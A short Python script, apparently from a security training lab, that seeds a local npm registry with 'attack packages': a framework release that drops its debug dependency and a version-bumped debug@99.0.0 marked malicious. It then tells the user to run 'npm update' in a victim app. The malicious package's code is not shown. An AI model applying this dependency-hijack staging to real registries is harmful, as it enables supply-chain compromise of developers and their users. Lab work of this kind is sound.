#!/usr/bin/env python3
from __future__ import annotations

from pathlib import Path

from weaklink_platform.registry_seed import npm_publish, prepare_verdaccio


def main() -> int:
    base_dir = Path(__file__).resolve().parent / "packages"
    print("=== Publishing attack packages ===")
    print()
    prepare_verdaccio()

    print("[1] Publishing wl-framework@2.0.0 (debug dependency REMOVED)...")
    npm_publish(base_dir / "wl-framework" / "v2")
    print("[+] wl-framework@2.0.0 published")
    print()

    print("[2] Publishing debug@99.0.0 (MALICIOUS)...")
    npm_publish(base_dir / "debug-malicious")
    print("[+] debug@99.0.0 published (malicious)")
    print()

    print("=== Attack packages ready ===")
    print()
    print("Now in the victim app, run:")
    print("  npm update")
    print()
    print("This will upgrade wl-framework to v2.0.0 and may resolve debug@99.0.0.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
